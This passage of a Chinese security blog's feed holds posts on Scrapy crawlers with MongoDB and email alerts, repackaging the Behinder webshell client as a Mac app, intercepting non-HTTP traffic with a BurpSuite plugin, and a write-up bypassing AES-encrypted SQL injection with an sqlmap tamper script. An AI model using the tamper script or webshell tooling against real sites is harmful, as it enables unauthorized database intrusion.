href="#邮件通知" class="headerlink" title="邮件通知"></a>邮件通知</h2><p>现在爬虫所获的的数据都会存储在MongoDB数据库中，通过读取数据库中当前日期的数据，进行邮件通知即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> scrapy.crawler <span class="keyword">import</span> CrawlerProcess</span><br><span class="line"><span class="keyword">from</span> scrapy.utils.project <span class="keyword">import</span> get_project_settings</span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> spiderloader</span><br><span class="line"></span><br><span class="line">settings = get_project_settings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_mail</span><span class="params">()</span>:</span></span><br><span class="line">    mongo_client = pymongo.MongoClient(host=settings[<span class="string">"MONGODB_HOST"</span>], port=settings[<span class="string">"MONGODB_PORT"</span>])</span><br><span class="line">    mongo_db = mongo_client[settings[<span class="string">"MONGODB_DBNAME"</span>]]</span><br><span class="line">    mongo_query = &#123;<span class="string">'time'</span>: time.strftime(<span class="string">"%Y-%m-%d"</span>).decode(<span class="string">'utf-8'</span>)&#125;</span><br><span class="line">    result = <span class="string">"邮件更新提醒:\n"</span></span><br><span class="line">    </span><br><span class="line">    spider_loader = spiderloader.SpiderLoader.from_settings(settings)</span><br><span class="line">    spiders = spider_loader.list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> spiders:</span><br><span class="line">        mongo_col = mongo_db[i]</span><br><span class="line">        <span class="keyword">if</span> mongo_col.find(mongo_query).sort(<span class="string">"ts"</span>,pymongo.ASCENDING).count() != <span class="number">0</span>:</span><br><span class="line">            result += <span class="string">'%s 有更新,请注意查收!\n'</span> % (i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += <span class="string">'%s无更新!\n'</span> % (i)</span><br><span class="line"></span><br><span class="line">    sender = settings[<span class="string">"MAIL_SENDER"</span>]</span><br><span class="line">    receivers = settings[<span class="string">"MAIL_RECEIVERS"</span>]</span><br><span class="line"></span><br><span class="line">    message = MIMEText(result,<span class="string">'plain'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">    message[<span class="string">'From'</span>] = Header(<span class="string">"hywell"</span>, <span class="string">'utf-8'</span>)</span><br><span class="line">    message[<span class="string">'To'</span>] = receivers</span><br><span class="line">    subject = <span class="string">"信息收集爬虫"</span></span><br><span class="line">    message[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    smtpObj = smtplib.SMTP() </span><br><span class="line">    smtpObj.connect(settings[<span class="string">"MAIL_HOST"</span>], <span class="number">25</span>)</span><br><span class="line">    smtpObj.login(settings[<span class="string">"MAIL_USER"</span>], settings[<span class="string">"MAIL_PASSWORD"</span>]) </span><br><span class="line">    smtpObj.sendmail(sender, receivers, message.as_string())</span><br><span class="line"></span><br><span class="line">    mongo_client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    process = CrawlerProcess(settings)</span><br><span class="line">    spider_loader = spiderloader.SpiderLoader.from_settings(settings)</span><br><span class="line">    spiders = spider_loader.list()</span><br><span class="line">    classes = [spider_loader.load(name) <span class="keyword">for</span> name <span class="keyword">in</span> spiders]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> classes:</span><br><span class="line">        process.crawl(i)</span><br><span class="line"></span><br><span class="line">    process.start()</span><br><span class="line">    send_mail()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>python2.7越来越“老旧了”，新的模块很多都已经不支持python2.7，后续还是得开始使用python3进行编程。毕竟，python最主要的就是可以import module；</li><li>在进行邮件发送的时候，要注意邮箱服务器的设置，例如：密码是否需要设置为独立密码、发件人信息是否有与账号匹配校验等；</li><li>由于Chrome最新版本不支持CentOS6，我通过种种方式安装上了Chrome以及成功运行ChromeDriver，但是在运行时会出现卡在开始连接<code>[urllib3.connectionpool] DEBUG: Starting new HTTP connection (1): 127.0.0.1:1269</code>，后面改用Firefox。</li></ol><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！<a href="https://github.com/HyWell/Python/tree/master/Crawler/zjyd" target="_blank" rel="noopener">Code</a>。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>jar文件打包成app</title>
    <url>/archives/4afab831.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在Mac上运行jar文件（例如Behinder）每次都需要</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -XstartOnFirstThread -jar Behinder.jar</span><br></pre></td></tr></table></figure><p>，感觉太繁琐了。因此，想打包成app方便使用。成功打包效果图如下，这里给大家提供打包出来的app。</p><p>链接:<a href="https://pan.baidu.com/s/1474CrgbbSfbXxqJGg9carA" target="_blank" rel="noopener">https://pan.baidu.com/s/1474CrgbbSfbXxqJGg9carA</a> 密码:f9vm</p><p><img src="https://i.loli.net/2018/12/01/5c0170f62716b.png" alt="成功效果图"></p><a id="more"></a><p>使用工具可方便的将jar文件打包成app，本文以Behinder为例，记录所遇到的问题以及如何处理。</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>下载<a href="https://github.com/Jorl17/jar2app" target="_blank" rel="noopener">jar2app</a>之后，将其安装。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Install</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Jorl17/jar2app</span><br><span class="line"><span class="built_in">cd</span> jar2app</span><br><span class="line">chmod +x install.sh uninstall.sh</span><br><span class="line">sudo ./install.sh</span><br><span class="line"><span class="comment"># Install to /usr/local/bin</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Jorl17/jar2app</span><br><span class="line"><span class="built_in">cd</span> jar2app</span><br><span class="line">chmod +x install.sh uninstall.sh</span><br><span class="line">sudo ./install.sh /usr/<span class="built_in">local</span>/bin</span><br></pre></td></tr></table></figure><h1 id="生成APP"><a href="#生成APP" class="headerlink" title="生成APP"></a>生成APP</h1><p>通过jar2app的命令我们可以得知，直接使用对应命令即可生成。其中需要注意以下两点：</p><ol><li>Behinder需要通过<code>-XstartOnFirstThread</code>命令启动；</li><li>Behinder需要jre6~jre8版本才可以运行。</li></ol><p>因此我在使用jar2app时，指定了JVM设置和JDK版本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jar2app Behinder.jar -j "-XstartOnFirstThread" -r /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk</span><br></pre></td></tr></table></figure><p>使用上面的命令可以成功生成一个app，但是直接运行无法打开。</p><h2 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h2><p>直接打开Behinder.app/Contents/MacOS/JavaAppLauncher启动脚本，提示数据库文件丢失，无法启动。</p><p><img src="https://i.loli.net/2018/12/01/5c0170f5b1d5a.png" alt="数据库文件丢失"></p><h3 id="数据库文件丢失"><a href="#数据库文件丢失" class="headerlink" title="数据库文件丢失"></a>数据库文件丢失</h3><p>根据报错信息提示以及Behinder本身的文件结构，我将data.db移动到Behinder.app/Contents和其他杂七杂八的位置都不行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Contents/data.db</span><br><span class="line">Contents/Java/data.db</span><br><span class="line">Contents/MacOS/data.db</span><br><span class="line">Contents/Plugins/jdk1.8.0_181.jdk/Contents/data.db</span><br><span class="line">Contents/Plugins/jdk1.8.0_181.jdk/Contents/MacOS/data.db</span><br><span class="line">Contents/Resources/data.db</span><br></pre></td></tr></table></figure><h3 id="重构class文件"><a href="#重构class文件" class="headerlink" title="重构class文件"></a>重构class文件</h3><p>根据报错信息（数据库文件丢失）以及上述所进行的测试方法，基于当前的情况，只能通过将jar包文件反编译成class文件进行查看，判断本身源码逻辑。这里我采用JD进行反编译，直接加载Behinder的jar包文件。根据关键字：data.db进行搜索。</p><p><img src="https://i.loli.net/2018/12/01/5c0170f5b2a6a.png" alt="源代码查询"></p><p>根据上图可以看到对应判断的逻辑在：net/rebeyond/behinder/core/ShellManager.class文件中：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span> File(<span class="string">"data.db"</span>).exists()) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"数据库文件丢失，无法启动。"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过File().exists()进行判断文件是否存在，根据大佬的提示得知File().exists()使用的user.home作为路径，将其修改成File.getAbsoluteFile()即可成功。</p><p><img src="https://i.loli.net/2018/12/01/5c0170f607879.png" alt="测试代码"></p><p><img src="https://i.loli.net/2018/12/01/5c016f6c85be7.png" alt="测试结果"></p><p>在JD将ShellManager.class保存成java代码，使用Intellij创建一个项目。Ps:也可以用eclipse等。</p><p>这里我新建了一个Maven项目，Project SDK选择1.8.0</p><p><img src="https://i.loli.net/2018/12/01/5c016f6c89823.png" alt="Project SDK"></p><p>下面有关字段全部设置成Behinder</p><p><img src="https://i.loli.net/2018/12/01/5c016f6b75627.png" alt="GroupId"></p><p><img src="https://i.loli.net/2018/12/01/5c016f6b739b1.png" alt="ProjectName"></p><p>将ShellManager.java文件拖入到src/main/java目录下，并将File().exists()修改成File().getAbsoluteFile().exists()。</p><p><img src="https://i.loli.net/2018/12/01/5c016f6c5748e.png" alt="修改代码"></p><p>新建一个package，右键java目录new即可创建，目录名称为net.rebeyond.behinder.core。该名称来源为ShellManager在Behinder.jar文件中的路径。将ShellManager.java文件移动到net.rebeyond.behinder.core中。</p><p><img src="https://i.loli.net/2018/12/01/5c016f6c5575f.png" alt="新目录结构"></p><p>此时还有一系列包引入问题待解决，这时候点击【File】选项中的【Project Structure】功能，在【Project Settings】中的【Modules】的【Dependencies】中引入Behinder.jar文件。</p><p><img src="https://i.loli.net/2018/12/01/5c016f6be64ec.png" alt="Project Structure"></p><p>这时候还存在模块无法import的问题，根据查看发现是json模块无法引入，查看JD中json包是20180130的。在<a href="https://jar-download.com/artifacts/org.json/json/20180130/source-code" target="_blank" rel="noopener">jar-download</a>页面进行下载即可，下载完成之后，按照刚刚的流程导入。导入完成之后，这时候已经所有包都正常import。</p><p><img src="https://i.loli.net/2018/12/01/5c016f6c8f06f.png" alt="import success"></p><p>使用【Build Project】将java文件编译成class文件。</p><p><img src="https://i.loli.net/2018/12/01/5c016f6c8c306.png" alt="BuildProject"></p><p>解压Behinder.jar文件，将解压出来的ShellManager.class文件替换成新编译出来的ShellManager.class文件。替换完成之后，使用压缩软件将其压缩成zip。将文件后缀修改成jar，在终端下运行，看能否成功运行。Ps：记得在Behinder.jar文件同级目录需要有一个data.db；这里有个问题，我用BetterZip将其压缩成zip之后，修改后缀无法运行，使用BandiZip（Windows）压缩可以，猜测有可能是软件压缩机制或者操作系统的问题。也可以使用jar命令进行打包。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jar -cfm Behinder.jar ./META-INF/MANIFEST.MF .<span class="comment">/*</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -XstartOnFirstThread -jar Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/12/01/5c016f6c65434.png" alt="运行成功"></p><p>可以成功运行，在使用jar2app命令将其打包成app</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jar2app Behinder.jar -j "-XstartOnFirstThread" -r /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk</span><br></pre></td></tr></table></figure><p>将data.db文件移动到Behinder.app/Contents即可成功运行。</p><h2 id="生成带有图标的APP"><a href="#生成带有图标的APP" class="headerlink" title="生成带有图标的APP"></a>生成带有图标的APP</h2><p>上面生成的app是没有图标的，jar2app有-i参数支持图标生成。直接将Behinder.jar文件的net/rebeyond/behinder/resource目录下的logo.jpg拿出来。使用<a href="https://iconverticons.com/online/" target="_blank" rel="noopener">ICON在线转换</a>，这里需要注意的是下载的文件格式应该为icns，并非是icon。</p><p>使用如下命令即可生成一个带有logo图标的Behinder.app文件。</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">jar2app Behinder<span class="selector-class">.jar</span> -j <span class="string">"-XstartOnFirstThread"</span> -r /Library/Java/JavaVirtualMachines/jdk1.<span class="number">8.0</span>_181<span class="selector-class">.jdk</span> -<span class="selector-tag">i</span> logo.icns</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里面踩了无数个坑，反反复复好长一段时间才解决。</p><ol><li>工具记得多读手册，例如在这里用的jar2app直接在GitHub上面多读手册，基本问题都能解决；</li><li>实现同样功能的不同函数，在使用时需要按照需求进行使用。例如这里的File().exists()与File.getAbsoluteFile()，不同函数名总有会不一样的地方，直接平时只是为了实现功能而忽略其本质，有时候出现问题的时候需要深入了解其本质；</li><li>在处理问题过程中使用到软件工具出现问题时，可不进行任何修改重复使用软件进行问题定位。例如这里的BetterZip压缩之后无法运行，我是通过直接解压缩-压缩-运行将这个问题定位出来的。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>工具环境</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite抓取非HTTP协议流量</title>
    <url>/archives/ffc80a19.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在进行APP渗透的时候，设置代理到BurpSuite的时候，发现没拦截到包，但是已经获取到数据。猜测是请求包走的是非HTTP协议，发现BurpSuite有一个插件可以抓取TCP的流量：NoPE Proxy。<br><img src="https://i.loli.net/2018/11/29/5bff79c9eb463.png" alt="" title="NoPE界面"></p><a id="more"></a><h1 id="NoPE安装"><a href="#NoPE安装" class="headerlink" title="NoPE安装"></a>NoPE安装</h1><p><a href="https://github.com/summitt/Burp-Non-HTTP-Extension/releases" target="_blank" rel="noopener" title="NoPE下载地址">NoPE</a>安装很简单，直接下载对应的jar文件，然后在BurpSuite的【Extender】选项卡中添加即可。Ps：记得要配置Java Environment环境。</p><h1 id="NoPE使用"><a href="#NoPE使用" class="headerlink" title="NoPE使用"></a>NoPE使用</h1><p>安装完成之后，需要对NoPE进行配置：DNS配置、HTTP代理设置等。</p><h2 id="Server设置"><a href="#Server设置" class="headerlink" title="Server设置"></a>Server设置</h2><p>在NoPE工具的【Server Config】选项卡进行配置，猜测设置DNS是为了获取请求包的domain。</p><ol><li>设置【DNS Response IP】和【DNS Listener Port】，将这个ip设置为代理服务器的ip地址，port设置为DNS常用端口：53；</li><li>设置【Interface】，这个是设置网卡，可通过<code>ifconfig</code>查看 ；</li><li>点击【Add 80 &amp; 443 to Burp】，将80、443端口添加到Burp。<br><img src="https://i.loli.net/2018/11/29/5bff7dc7c120a.png" alt="服务器配置" title="Server Config"><br>设置完之后回到【Proxy】选项卡的【Options】看一下，并且将Invisible设置为勾选（如果没勾选）。Ps：这时候可以使用手机进行操作，看看BurpSuite能不能拦截到HTTP的包。<br><img src="https://i.loli.net/2018/11/29/5bff7ef9103f7.png" alt="" title="Proxy setting.png"><h2 id="HTTP-Proxy设置"><a href="#HTTP-Proxy设置" class="headerlink" title="HTTP Proxy设置"></a>HTTP Proxy设置</h2>设置完Server之后，在【NoPE Proxy】选项卡的【Server Config】中启动DNS服务，直接点击那个大大的绿色箭头就可以了，显示红色为已经运行。<br><img src="https://i.loli.net/2018/11/29/5bff7fac6fdf5.png" alt="" title="Run DNS Server"><br>查看【DNS History】选项卡中的DNS记录，获取Domain、Port等信息。</li><li>开启Port Monitor；</li><li>在手机上进行操作,<strong><font color="red">手机DNS配置成PC的地址</font></strong>；</li><li>获取Domain和与其对应的Port。<br>在获取对应Port有可能会有点烦，我在获取Port的时候每次会有一堆的信息冒出来，导致并不知道那个Port跟domain是对应上的，所以点了好多次。<br><img src="https://i.loli.net/2018/11/29/5bff8190e5207.png" alt="获取Domain Port等信息" title="DNS History"><br>获取到Domain与Port之后，回到【Server Config】选项卡中，将信息填入到【Non HTTP Proxy Settings】中，例如我现在有了一个domain为xxxx.com，端口为8020，将其填入对应的地方进行添加，添加之后勾选Enable即可。<br><img src="https://i.loli.net/2018/11/29/5bff8483456cf.png" alt="设置http代理：domain、port" title="Proxy Settings"><h2 id="拦截TCP流量"><a href="#拦截TCP流量" class="headerlink" title="拦截TCP流量"></a>拦截TCP流量</h2>通过上面的配置，现在已经可以通过NoPE拦截非HTTP协议的流量。在【TCP intercept】选项卡开启【Intercept is ON】，在手机上进行操作，就可以在下面看到对应的请求包。<br><img src="https://i.loli.net/2018/11/29/5bff85541c135.png" alt="" title="TCP Intercept"><br>由于我这边已经把包放过了，给大家看下历史记录的包。<br><img src="https://i.loli.net/2018/11/29/5bff85548e480.png" alt="" title="TCP History"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>通过这种方式已经可以拦截到TCP的流量，但是通过NoPE感觉操作很繁琐。不知道有没有比的简单、优雅的方式？</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-Scrapy学习(三)</title>
    <url>/archives/80b032ee.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>继续学习scrapy,这次学习如何将数据进行存储。<br><a href="https://i.loli.net/2018/11/23/5bf7b1e887464.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7b1e887464.png" alt="mongo数据.png"></a></p><a id="more"></a><p>在学习如何通过xpath获取数据，接下来通过MongDB or MySQL将数据进行保存。</p><h1 id="scrapy数据存储"><a href="#scrapy数据存储" class="headerlink" title="scrapy数据存储"></a>scrapy数据存储</h1><h2 id="freebuf搜索信息爬取"><a href="#freebuf搜索信息爬取" class="headerlink" title="freebuf搜索信息爬取"></a>freebuf搜索信息爬取</h2><p>上一章中爬取的数据为freebuf首页的资讯，这次爬取freebuf搜索所产生的数据。Ps：上一章通过HTTP进行访问，这次直接通过HTTPS就不需要考虑COOKIE的问题。<br>由于搜索返回的是json，因此不需要使用xpath，直接使用json进行解析即可获取数据。这里就直接贴上爬取代码：<br>​ # -<em>- coding: utf-8 -</em>-<br>​ import scrapy<br>​ import time<br>​ import json<br>​ import pymongo<br>​<br>from freebuf.items import FreebufItem</p><p>​<br>​ class FreebufSpider(scrapy.Spider):<br>​ name = ‘freebuf’<br>​ allowed_domains = [‘freebuf.com’]<br>​ custom_settings = {<br>​ ‘ITEM_PIPELINES’: {<br>​ ‘freebuf.pipelines.MongodbPipeline’: 300,<br>​ }<br>​ }<br>​<br>def start_requests(self):<br>urls = [<br>u’<a href="https://search.freebuf.com/search/find/?year=0&amp;score=0&amp;articleType=0&amp;origin=0&amp;tabType=1&amp;content=攻击&amp;page=1&#39;" target="_blank" rel="noopener">https://search.freebuf.com/search/find/?year=0&amp;score=0&amp;articleType=0&amp;origin=0&amp;tabType=1&amp;content=攻击&amp;page=1&#39;</a>,<br>]<br>for url in urls:<br>yield scrapy.Request(url=url, callback=self.parse)</p><pre><code>def parse(self, response):
    item = FreebufItem()
    data = json.loads(response.body_as_unicode())
    if data[&quot;data&quot;][&quot;total&quot;] != u&apos;0&apos;:
        page = int(response.url[response.url.find(&apos;page=&apos;) + 5:]) + 1
        next_page = response.url[:response.url.find(&apos;page=&apos;) + 5] + str(page)
        for i in data[&quot;data&quot;][&quot;list&quot;]:
            if i[&quot;time&quot;] == time.strftime(&quot;%Y-%m-%d&quot;).decode(&apos;utf-8&apos;):
                item[&apos;source&apos;] = &apos;freebuf&apos;
                item[&apos;title&apos;] = i[&quot;title&quot;]
                item[&apos;url&apos;] = i[&apos;url&apos;]
                item[&apos;content&apos;] = i[&apos;content&apos;]
                item[&apos;time&apos;] = i[&apos;time&apos;]
                item[&apos;author&apos;] = i[&apos;name&apos;]
            else:
                next_page = None
                continue
    yield item
    if next_page is not None:
        next_page = response.urljoin(next_page)
        yield scrapy.Request(next_page, callback=self.parse)
    self.log(&quot;Freebuf sprider:%s&quot; % (response.url))</code></pre><p><code>custom_settings</code>用于爬虫自定义设置，该优先级大于项目设置。这里设置使用pipelines.py文件中MongodbPipeline类对数据进行处理，优先级300（数字越小，优先级越高）。</p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>在piplines.py中我写了两个类：MongodbPipeline、MysqlPipeline，分别存储进MongoDB、MySQL。其中MongoDB已经测试，可完美进行存储；MySQL还未进行测试。<br>​ # -<em>- coding: utf-8 -</em>-<br>​<br># Define your item pipelines here<br>#<br># Don’t forget to add your pipeline to the ITEM_PIPELINES setting<br># See: <a href="https://doc.scrapy.org/en/latest/topics/item-pipeline.html" target="_blank" rel="noopener">https://doc.scrapy.org/en/latest/topics/item-pipeline.html</a></p><pre><code>import pymongo
import pymysql

from scrapy import log
from scrapy.conf import settings
from twisted.enterprise import adbapi</code></pre><p>​<br>​ class MongodbPipeline(object):<br>​ def <strong>init</strong>(self):<br>​ self.mongo_host = settings[“MONGODB_HOST”]<br>​ self.mongo_port = settings[“MONGODB_PORT”]<br>​ self.mongo_db = settings[“MONGODB_DBNAME”]<br>​<br>def open_spider(self, spider):<br>self.client = pymongo.MongoClient(host=self.mongo_host, port=self.mongo_port)<br>self.db = self.client[self.mongo_db]</p><pre><code>    def close_spider(self, spider):
        self.client.close()

    def process_item(self, item, spider):
        info = dict(item)
        self.db[item[&apos;source&apos;]].insert_one(info)
        return item

class MysqlPipeline(object):
    def __init__(self):
        dbparms = dict(
            host = settings[&apos;MYSQL_HOST&apos;],
            port = settings[&apos;MYSQL_PORT&apos;],
            dbname = settings[&apos;MYSQL_DBNAME&apos;],
            user = settings[&apos;MYSQL_USER&apos;],
            passwd = settings[&apos;MYSQL_PASSWORD&apos;],
            charset = &apos;utf8&apos;,
            cursorclass = pymysql.cursors.DictCursor,
            use_unicode = True,
        )
        self.dbpool = adbapi.ConnectionPool(&quot;pymysql&quot;, **dbparms)

    def process_item(self, item, spider):
            query = self.dbpool.runInteraction(self.do_insert, item, spider)
            log.msg(&quot;MySQL connect&quot;)
            query.addErrback(self.handle_error, item, spider)
            query.addBoth(lambda _: item)
            return query

    def handle_error(self, failure, item, spider):
        print failure

    def do_insert(self, cursor, item):
        cursor.execute(&quot;insert into freebuf (title, url, content, time, author, source) values(%s, %s, %s, %s, %s, %s)&quot;,
                        item[&apos;title&apos;], item[&apos;url&apos;], item[&apos;content&apos;], item[&apos;time&apos;], item[&apos;author&apos;], item[&apos;source&apos;])</code></pre><h2 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h2><p>在项目settings.py文件需要定义数据库host、port、username、password等，直接在最后面加上配置信息即可。<br>​ # MongDB Config<br>​ MONGODB_HOST = ‘localhost’<br>​ MONGODB_PORT = 27017<br>​ MONGODB_DBNAME = ‘freebuf’<br>​<br># MySQL Config<br># MYSQL_HOST = ‘localhost’<br># MYSQL_PORT = 3306<br># MYSQL_DBNAME = ‘freebuf’<br># MYSQL_USER = ‘root’<br># MYSQL_PASSWORD = ‘root’</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>项目、爬虫本身都可以进行配置，爬虫本身所配置的优先级大于项目。优先级：Command line options (most precedence)&gt; Settings per-spider&gt; Project settings module&gt; Default settings per-command&gt; Default global settings (less precedence)；</li><li>通过response.urljoin可将需要爬取的url添加至待爬取池，只要解析规则正确就可以将所需要的页面不断加入待爬取池；</li><li>scrapy函数大部分都可以通过callback进行回调，yield进行资源控制超级棒；</li><li>感觉item.py文件利用的较少，应该还有我不知道的用途。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>scrapy</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试-加密SQL注入</title>
    <url>/archives/5f6b1580.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在日站的时候，发现一处注入。但是注入语句被AES加密。通过Chrome进行单步debug，拿到了key、iv等信息。最后使用SQLMap加载tamper进行自动注入。<br><a href="https://i.loli.net/2018/11/06/5be139214993c.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/06/5be139214993c.png" alt="sqlmap.png"></a></p><a id="more"></a><h1 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h1><p>渗透的时候，发现了一个页面，参数有initSql，看到这个参数名称猜测这个参数是用来进行SQL查询的，但是这个参数被加密了。将initSql的值替换成后一个请求的initSql参数的值，回显信息里面出现了SQL报错信息。<br><a href="https://i.loli.net/2018/11/06/5be131bc0ea0a.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/06/5be131bc0ea0a.png" alt="SQL加密.png"></a><br>现在可以判断这个就是一个注入点，但是现在这样是没办法把数据成功注入出来！转头一想，进行请求的时候参数值已经被加密，那么这个加密操作十有八九是在前端通过JS进行加密，服务器再进行解密。</p><h1 id="寻找加密信息"><a href="#寻找加密信息" class="headerlink" title="寻找加密信息"></a>寻找加密信息</h1><p>按照刚刚的思路，现在去import的JS里面进行寻找关键的加密函数以及加密，使用chrome开发者工具中的【Select an element in the page to inspect it】定位到【Sources】中的对应行业，点击左边的行数进行debug，通过不断的单步直至找到对应的js。<br><a href="https://i.loli.net/2018/11/06/5be133a64fb94.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/06/5be133a64fb94.png" alt="key.png"></a><br>使用找到的iv、key可成功的对加密之后的语句进行解密，但是这样去注入得手工一点一点的去搞，还是得祭出SQLMap这种神器最方便。<br>想起SQLMap可以使用tamper加载脚本，对注入的payload进行处理。这里直接把代码贴上来给大家参考参考。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">"""</span><br><span class="line">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file 'LICENSE' for copying permission</span><br><span class="line">"""</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):        </span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</span><br><span class="line">    </span><br><span class="line">    key = "xxxxxxxxxx"</span><br><span class="line">    iv = "xxxxxxxx"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cipher = AES.<span class="built_in">new</span>(key)</span><br><span class="line">    cipher = AES.<span class="built_in">new</span>(key,</span><br><span class="line">    AES.MODE_CBC, IV=iv)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">encrypted</span> = cipher.encrypt(pad(payload))</span><br><span class="line">    <span class="keyword">encrypted</span> = base64.b64encode(<span class="keyword">encrypted</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">encrypted</span></span><br></pre></td></tr></table></figure><p>后面加载这个tamper就可以直接用SQLMap跑了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>这个漏洞产生原因”大概“是因为上次被发现注入，开发人员”偷懒“直接调用CryptoJS进行加密，导致该漏洞产生；</li><li>现在很多操作都会放在前端进行操作，挖挖前端也是一种思路。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-Scrapy学习(二)</title>
    <url>/archives/2ba6ae11.html</url>
